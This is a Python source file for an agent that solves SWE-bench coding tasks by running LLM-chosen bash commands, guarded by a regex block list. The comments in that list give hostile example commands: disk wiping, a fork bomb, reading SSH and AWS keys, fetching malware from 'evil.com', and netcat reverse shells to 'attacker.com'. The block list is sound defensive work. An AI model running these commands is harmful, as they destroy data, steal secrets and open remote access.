# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Iterative agent-based predictor for SWE-bench problems.

This predictor implements a step-by-step approach where the agent:
1. Receives a problem statement
2. Executes bash commands iteratively
3. Observes results and adjusts strategy
4. Generates patch using git diff

The iterative loop and prompts are inspired by mini-swe-agent, adapted for the NAT framework.
"""

import asyncio
import json
import logging
import re
import subprocess
from dataclasses import dataclass
from pathlib import Path

from git.exc import GitCommandError
from langchain_core.messages import AIMessage, HumanMessage, SystemMessage
from rich.console import Console

from nat.builder.builder import Builder
from nat.builder.framework_enum import LLMFrameworkEnum
from nat.data_models.swe_bench_model import SWEBenchInput

from nat_swe_bench.config import SweBenchWorkflowConfig
from nat_swe_bench.predictors.predict_abc import SweBenchPredictorBase
from nat_swe_bench.predictors.predictor_registry import register_predictor

logger = logging.getLogger(__name__)

console = Console(highlight=False)


class NonTerminatingException(Exception):
    """Raised for conditions that can be handled by the agent."""


class TerminatingException(Exception):
    """Raised for conditions that terminate the agent."""


class FormatError(NonTerminatingException):
    """Raised when the LLM's output is not in the expected format."""


class ExecutionTimeoutError(NonTerminatingException):
    """Raised when the action execution timed out."""


class Submitted(TerminatingException):
    """Raised when the agent has finished its task."""


class LimitsExceeded(TerminatingException):
    """Raised when the agent has reached its step limit."""


@dataclass
class IterativeAgentConfig:
    """Configuration for the iterative agent."""
    step_limit: int = 250
    timeout: int = 60
    max_output_length: int = 10000


# Dangerous command patterns that should be blocked for security.
# Each tuple contains (compiled_regex, error_message).
DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
    # ===== Destructive system commands =====
    # Examples: "rm -rf /", "rm -rf ~", "rm -fr /"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*[/~](\s|$)'),
     "Deleting root or home directory is not allowed"),

    # Examples: "rm -rf ..", "rm -rf ../important"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*\.\.'),
     "Deleting parent directory is not allowed"),

    # Examples: "rm -rf *", "rm -rf ./*"
    (re.compile(r'\brm\s+(-[^\s]*\s+)*\*'),
     "Wildcard deletion is not allowed"),

    # Examples: "> /dev/sda", "echo x > /dev/mem" (allows /dev/null)
    (re.compile(r'>\s*/dev/(?!null)'),
     "Writing to device files is not allowed"),

    # Examples: "mkfs.ext4 /dev/sda", "mkfs -t ext4 /dev/sda1"
    (re.compile(r'\bmkfs\b'),
     "Formatting disks is not allowed"),

    # Examples: "fdisk /dev/sda", "fdisk -l /dev/nvme0n1"
    (re.compile(r'\bfdisk\b'),
     "Disk partitioning is not allowed"),

    # Examples: "dd if=/dev/zero of=/dev/sda", "dd of=/dev/nvme0n1"
    (re.compile(r'\bdd\s+.*\bof=/dev/'),
     "Writing to devices with dd is not allowed"),

    # Examples: "dd if=/dev/sda of=disk.img" (reading sensitive disk data)
    (re.compile(r'\bdd\s+.*\bif=/dev/'),
     "Reading from devices with dd is not allowed"),

    # Fork bomb: :(){ :|:& };:
    (re.compile(r':\(\)\s*\{\s*:\|:&\s*\}\s*;:'),
     "Fork bomb detected"),

    # ===== Privilege escalation =====
    # Examples: "sudo rm -rf /", "echo pwd | sudo -S cmd", "/usr/bin/sudo cmd"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?sudo\b'),
     "sudo is not allowed"),

    # Examples: "doas rm file", "/usr/bin/doas cmd"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?doas\b'),
     "doas is not allowed"),

    # Examples: "pkexec rm file", "pkexec /bin/bash"
    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?pkexec\b'),
     "pkexec is not allowed"),

    # Examples: "su root", "su - admin", "su -c 'command' user"
    (re.compile(r'(?:^|[;&|`]\s*)su\s+(-[^\s]*\s+)*\w'),
     "su is not allowed"),

    # Examples: "chmod 777 /", "chmod -R 0777 /var"
    (re.compile(r'\bchmod\s+[0-7]*777\b'),
     "Setting 777 permissions is not allowed"),

    # Examples: "chown root file", "chown root:root /etc/passwd"
    (re.compile(r'\bchown\s+root\b'),
     "Changing ownership to root is not allowed"),

    # ===== Sensitive file access =====
    # Examples: "cat /etc/shadow", "> /etc/passwd", "< /etc/sudoers"
    (re.compile(r'[<>]\s*/etc/(?:passwd|shadow|sudoers)'),
     "Accessing sensitive system files is not allowed"),

    # Examples: "cat ~/.ssh/id_rsa", "cat /home/user/.aws/credentials"
    (re.compile(r'\bcat\s+.*/(?:\.ssh/|\.aws/|\.env\b)'),
     "Reading sensitive credential files is not allowed"),

    # ===== Arbitrary code download and network exfiltration =====
    # Examples: "wget http://evil.com/malware.sh", "wget https://x.com/script"
    (re.compile(r'\bwget\s+.*https?://'),
     "Downloading from URLs with wget is not allowed"),

    # Examples: "curl http://evil.com/script.sh", "curl -O https://..."
    (re.compile(r'\bcurl\s+.*https?://'),
     "Downloading from URLs with curl is not allowed"),

    # Examples: "nc -e /bin/bash 10.0.0.1 4444", "ncat -e cmd attacker.com"
    (re.compile(r'\b(?:nc|ncat|netcat)\b.*\s-[^\s]*e'),
     "Netcat reverse shell is not allowed"),
]


def validate_command(command: str) -> tuple[bool, str]:
    """Validate that a command is safe to execute.

    Args:
        command: The bash command string to validate.

    Returns:
        A tuple of (is_valid, error_message).
        is_valid is True if the command passes all safety checks.
        error_message is empty string if valid, otherwise describes the violation.
    """
    for pattern, message in DANGEROUS_PATTERNS:
        if pattern.search(command):
            return False, message
    return True, ""


class IterativeAgent:
    """Iterative agent that executes commands step-by-step."""

    # Timeout message template 
    _TIMEOUT_TEMPLATE = (
        "The last command <command>{action}</command> timed out and has been killed.\n"
        "The output of the command was:\n <output>\n{output}\n</output>\n"
        "Please try another command and make sure to avoid those requiring interactive input."
    )

    # Output truncation warning message 
    _OUTPUT_TRUNCATION_WARNING = (
        "\n<warning>\n"
        "The output of your last command was too long.\n"
        "Please try a different command that produces less output.\n"
        "If you're looking at a file you can try use head, tail or sed to view a smaller number of lines selectively.\n"
        "If you're using grep or find and it produced too much output, you can use a more selective search pattern.\n"
        "If you really need to see something from the full command's output, you can redirect output to a file and then search in that file.\n"
        "</warning>\n\n"
    )

    def __init__(self, llm, repo_path: Path, config: IterativeAgentConfig):
        self.llm = llm
        self.repo_path = repo_path
        self.config = config
        self.messages: list = []
        self.n_steps = 0

    def add_message(self, role: str, content: str):
        """Add a message to the conversation and print it for debugging.

        Args:
            role: The role of the message sender. Must be one of:
                  "system", "user", "human", "assistant", or "ai".
            content: The message content to add.

        Raises:
            ValueError: If role is not a recognized value.
        """
        if role == "system":
            msg = SystemMessage(content=content)
            self.messages.append(msg)
            console.print(f"\n[bold blue]System[/bold blue] (step {self.n_steps}):\n", end="", highlight=False)
        elif role == "user" or role == "human":
            msg = HumanMessage(content=content)
            self.messages.append(msg)
            console.print(f"\n[bold green]User[/bold green] (step {self.n_steps}):\n", end="", highlight=False)
        elif role == "assistant" or role == "ai":
            msg = AIMessage(content=content)
            self.messages.append(msg)
            console.print(f"\n[bold red]Assistant[/bold red] (step {self.n_steps}):\n", end="", highlight=False)
        else:
            raise ValueError(f"Unknown role: {role}")
        
        # Print content
        console.print(content, highlight=False, markup=False)

    def _build_prompts(self, task: str, repo_path: Path) -> tuple[str, str]:
        """Build system and instance prompts customized for SWE-bench.

        Args:
            task: The task description/PR description.
            repo_path: Path to the repository being worked on.

        Returns:
            A tuple of (system_prompt, instance_prompt) strings.
        """
        # Convert Path to string for template usage
        repo_path_str = str(repo_path)
        
        system_template = """You are a helpful assistant that can interact multiple times with a computer shell to solve programming tasks.
Your response must contain exactly ONE bash code block with ONE command (or commands connected with && or ||).

Include a THOUGHT section before your command where you explain your reasoning process.
Format your response as shown in <format_example>.

<format_example>
THOUGHT: Your reasoning and analysis here

```bash
your_command_here
```
</format_example>

Failure to follow these rules will cause your response to be rejected."""

        instance_template = f"""<pr_description>
Consider the following PR description:
{task}
</pr_description>

<instructions>
# Task Instructions

## Overview
You're a software engineer interacting continuously with a computer by submitting commands.
You'll be helping implement necessary changes to meet requirements in the PR description.
Your task is specifically to make changes to non-test files in the current directory in order to fix the issue described in the PR description in a way that is general and consistent with the codebase.

IMPORTANT: This is an interactive process where you will think and issue ONE command, see its result, then think and issue your next command.

For each response:
1. Include a THOUGHT section explaining your reasoning and what you're trying to accomplish
2. Provide exactly ONE bash command to execute

## Important Boundaries
- MODIFY: Regular source code files in {repo_path_str} (this is the working directory for all your subsequent commands)
- DO NOT MODIFY: Tests, configuration files (pyproject.toml, setup.cfg, etc.)

## Recommended Workflow
1. Analyze the codebase by finding and reading relevant files
2. Create a script to reproduce the issue
3. Edit the source code to resolve the issue
4. Verify your fix works by running your script again
5. Test edge cases to ensure your fix is robust
6. Clean up any temporary files you created (test scripts, plans, summaries, etc.)

## Command Execution Rules
You are operating in an environment where
1. You write a single command
2. The system executes that command in a subshell
3. You see the result
4. You write your next command

Each response should include:
1. A **THOUGHT** section where you explain your reasoning and plan
2. A single bash code block with your command

Format your responses like this:

<format_example>
THOUGHT: Here I explain my reasoning process, analysis of the current situation,
and what I'm trying to accomplish with the command below.

```bash
your_command_here
```
</format_example>

Commands must be specified in a single bash code block:

```bash
your_command_here
```

**CRITICAL REQUIREMENTS:**
- Your response SHOULD include a THOUGHT section explaining your reasoning
- Your response MUST include EXACTLY ONE bash code block
- This bash block MUST contain EXACTLY ONE command (or a set of commands connected with && or ||)
- If you include zero or multiple bash blocks, or no command at all, YOUR RESPONSE WILL FAIL
- Do NOT try to run multiple independent commands in separate blocks in one response
- Directory or environment variable changes are not persistent. Every action is executed in a new subshell.
- However, you can prefix any action with `MY_ENV_VAR=MY_VALUE cd /path/to/working/dir && ...` or write/load environment variables from files

Example of a CORRECT response:
<example_response>
THOUGHT: I need to understand the structure of the repository first. Let me check what files are in the current directory to get a better understanding of the codebase.

```bash
ls -la
```
</example_response>

Example of an INCORRECT response:
<example_response>
THOUGHT: I need to examine the codebase and then look at a specific file. I'll run multiple commands to do this.

```bash
ls -la
```

Now I'll read the file:

```bash
cat file.txt
```
</example_response>

If you need to run multiple commands, either:
1. Combine them in one block using && or ||
```bash
command1 && command2 || echo "Error occurred"
```

2. Wait for the first command to complete, see its output, then issue the next command in your following response.

## Environment Details
- You have a full Linux shell environment
- Always use non-interactive flags (-y, -f) for commands
- Avoid interactive tools like vi, nano, or any that require user input
- If a command isn't available, you can install it

## Useful Command Examples

### Create a new file:
```bash
cat <<'EOF' > newfile.py
import numpy as np
hello = "world"
print(hello)
EOF
```

### Edit files with sed:
```bash
# Replace all occurrences
sed -i 's/old_string/new_string/g' filename.py

# Replace only first occurrence
sed -i 's/old_string/new_string/' filename.py

# Replace first occurrence on line 1
sed -i '1s/old_string/new_string/' filename.py

# Replace all occurrences in lines 1-10
sed -i '1,10s/old_string/new_string/g' filename.py
```

### View file content:
```bash
# View specific lines with numbers
nl -ba filename.py | sed -n '10,20p'
```

### Any other command you want to run
```bash
anything
```

## Submission
When you've completed your work (reading, editing, testing), and cannot make further progress
issue exactly the following command:

```bash
echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached
```

This command will submit your work.
You cannot continue working (reading, editing, testing) in any way on this task after submitting.
</instructions>"""

        return system_template, instance_template

    async def run(self, task: str) -> tuple[str, str]:
        """Run the iterative agent loop until completion.

        Executes commands step-by-step, observing results and adjusting strategy
        until the task is completed or limits are exceeded.

        Args:
            task: The task description to solve.

        Returns:
            A tuple of (exit_status, result) where exit_status is either
            "Submitted" or "LimitsExceeded", and result is the patch or error message.
        """
        system_template, instance_template = self._build_prompts(task, self.repo_path)

        self.messages = []
        self.add_message("system", system_template)
        self.add_message("user", instance_template)

        while True:
            try:
                # Check limits
                if 0 < self.config.step_limit <= self.n_steps:
                    raise LimitsExceeded(f"Reached step limit: {self.config.step_limit}")

                self.n_steps += 1
                
                response = await self._query_llm()
                observation = await self._execute_action(response)

                # Check if completed
                if "COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT" in observation:
                    # Extract patch from git diff output
                    patch_lines = observation.split("\n", 1)
                    if len(patch_lines) > 1:
                        patch = patch_lines[1]
                        raise Submitted(patch)
                    raise Submitted(observation)

                self.add_message("user", f"Observation:\n{observation}")

            except NonTerminatingException as e:
                # Recoverable errors: add error message and continue
                self.add_message("user", str(e))
            except TerminatingException as e:
                # Terminal errors: add error message and return
                self.add_message("user", str(e))
                return type(e).__name__, str(e)

    async def _query_llm(self) -> str:
        """Query LLM and return response content.

        Returns:
            The LLM response content as a string.

        Raises:
            NonTerminatingException: If the LLM invocation fails.
        """
        try:
            response = await self.llm.ainvoke(self.messages)                    
            content = response.content if hasattr(response, 'content') else str(response)
            self.add_message("assistant", content)
            return content
        except Exception as e:
            logger.error("LLM invocation failed: %s", e, exc_info=True)
            # recoverable error, let the agent continue
            raise NonTerminatingException(f"LLM call failed: {str(e)}")

    async def _execute_action(self, response: str) -> str:
        """Parse action from response and execute it asynchronously.

        Args:
            response: The LLM response containing a bash code block.

        Returns:
            The command output including returncode.

        Raises:
            FormatError: If the response doesn't contain exactly one bash block,
                        or if the command fails security validation.
            ExecutionTimeoutError: If the command execution times out.
            NonTerminatingException: If command execution fails unexpectedly.
        """
        # Extract bash command from response
        action_regex = r"```bash\s*\n(.*?)\n```"
        matches = re.findall(action_regex, response, re.DOTALL)
        if len(matches) != 1:
            error_msg = f"Expected exactly one bash command, found {len(matches)}"
            raise FormatError(error_msg)

        command = matches[0].strip()

        # Validate command for security before execution
        is_valid, error_msg = validate_command(command)
        if not is_valid:
            raise FormatError(f"Command blocked for security: {error_msg}")

        # Execute command using asyncio.to_thread to avoid blocking
        def run_cmd():
            """Synchronous command execution function."""
            return subprocess.run(
                command,
                shell=True,
                cwd=str(self.repo_path),
                timeout=self.config.timeout,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,  # stderr redirected to stdout
                text=True,
                encoding="utf-8",
                errors="replace"
            )

        try:
            result = await asyncio.to_thread(run_cmd)
            
            # stderr is automatically redirected to stdout via stderr=subprocess.STDOUT
            output = result.stdout if result.stdout else ""
            
            # Include returncode in the output so agent know action success or fail
            output = f"<returncode>{result.returncode}</returncode>\n{output}"

            # Truncate long outputs
            max_length = self.config.max_output_length
            if len(output) > max_length:
                elided_chars = len(output) - max_length
                head_tail_length = max_length // 2
                output = (
                    f"{output[:head_tail_length]}\n"
                    f"<elided_chars>\n{elided_chars} characters elided\n</elided_chars>\n"
                    f"{output[-head_tail_length:]}"
                )
                output = self._OUTPUT_TRUNCATION_WARNING + output

            return output

        except (TimeoutError, subprocess.TimeoutExpired) as e:
            # Extract output from exception if available (only subprocess.TimeoutExpired has output attribute)
            if isinstance(e, subprocess.TimeoutExpired) and hasattr(e, "output") and e.output:
                output = e.output if isinstance(e.output, str) else e.output.decode("utf-8", errors="replace")
            else:
                output = ""
            # Format timeout message using template
            timeout_message = self._TIMEOUT_TEMPLATE.format(
                action=command,
                output=output
            )
            raise ExecutionTimeoutError(timeout_message)
        except Exception as e:
            raise NonTerminatingException(f"Error executing command: {str(e)}")


@register_predictor("iterative")
class SweBenchPredictor(SweBenchPredictorBase):
    """Iterative agent-based predictor for SWE-bench."""

    def __init__(self, config: SweBenchWorkflowConfig, builder: Builder):
        super().__init__(config, builder)
        self.git_tool = None

    async def predict_fn(self, swebench_input: SWEBenchInput) -> str:
        """Generate patch using iterative agent approach.

        Args:
            swebench_input: The SWE-bench problem instance to solve.

        Returns:
            The generated patch as a string, or an error message if failed.
        """
        logger.info("Processing instance %s with iterative agent", swebench_input.instance_id)

        # Setup repository
        if self.git_tool is None:
            self.git_tool = await self.builder.get_tool(
                "git_repo_tool",
                wrapper_type=LLMFrameworkEnum.LANGCHAIN
            )

        repo_name = swebench_input.instance_id.rsplit('-', 1)[0]   # eg. scikit-learn__scikit-learn-14520
        org, repo = repo_name.split('__')
        repo_url = f"https://github.com/{org}/{repo}"

        # Setup repo with instance_id for workspace isolation
        try:
            repo_path_str = await self.git_tool.arun(json.dumps({
                "operation": "setup",
                "repo_url": repo_url,
                "base_commit": swebench_input.base_commit,
                "instance_id": swebench_input.instance_id  # Isolate workspace per instance
            }))
            repo_path = Path(repo_path_str)
            logger.info("Repository setup at %s", repo_path)
        except GitCommandError as e:
            logger.error("Git operation failed: %s", e, exc_info=True)
            return f"Error: Git operation failed - {e.stderr}"
        except OSError as e:
            logger.error("Filesystem error: %s", e, exc_info=True)
            return f"Error: Workspace setup failed - {str(e)}"
        except Exception as e:
            logger.exception("Unexpected error during repo setup: %s", e)
            return f"Error: Setup failed - {str(e)}"

        try:
            # Get LLM
            llm = await self.builder.get_llm(
                self.config.predictor.llm_name,
                wrapper_type=LLMFrameworkEnum.LANGCHAIN
            )

            # Build task description
            task = self._build_task_description(swebench_input)

            # Create agent config
            agent_config = IterativeAgentConfig(
                step_limit=getattr(self.config.predictor, 'step_limit', 250),
                timeout=getattr(self.config.predictor, 'timeout', 60)
            )

            # Run iterative agent
            agent = IterativeAgent(llm, repo_path, agent_config)
            exit_status, patch = await agent.run(task)

            if exit_status == "Submitted":
                logger.info("Agent completed successfully with patch")
                return patch
            else:
                logger.warning(f"Agent exited with status: {exit_status}, result: {patch[:200] if patch else 'None'}")
                return f"Error: {exit_status} - {patch}"

        except Exception as e:
            logger.exception(f"Error processing {swebench_input.instance_id}: {e}")
            return f"Error: {str(e)}"

    def _build_task_description(self, swebench_input: SWEBenchInput) -> str:
        """Build task description from SWE-bench input.

        Args:
            swebench_input: The SWE-bench problem instance.

        Returns:
            Combined task description with problem statement and hints.
        """
        parts = [swebench_input.problem_statement]
        if swebench_input.hints_text:
            parts.append(f"\nAdditional Context:\n{swebench_input.hints_text}")
        return "\n".join(parts)


